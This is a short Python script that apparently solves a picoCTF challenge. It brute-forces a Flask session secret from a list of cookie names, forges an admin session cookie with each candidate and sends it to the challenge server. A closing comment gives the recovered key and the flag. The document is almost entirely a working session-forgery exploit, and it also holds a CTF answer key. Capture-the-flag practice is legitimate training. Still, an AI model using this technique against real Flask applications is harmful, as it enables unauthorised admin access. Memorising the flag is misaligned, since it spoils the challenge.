import subprocess
import requests

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
session_cookie = b"eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YFZ7Fw.3JY8QTY_S5s1G5yVgAJfViYg6OM"
raw_cookie = b'{"very_auth":"admin"}'

for cn in cookie_names:
    res = subprocess.run(['flask_session_cookie_manager3.py', 'encode', '-s', cn, '-t', raw_cookie], stdout=subprocess.PIPE)
    print(cn + ":", res.stdout.strip())
    r = requests.get('http://mercury.picoctf.net:35697/display', cookies=dict(session=res.stdout.strip().decode()), allow_redirects=False)
    print(r.text)

# Correct key: lebkuchen
# picoCTF{pwn_4ll_th3_cook1E5_22fe0842}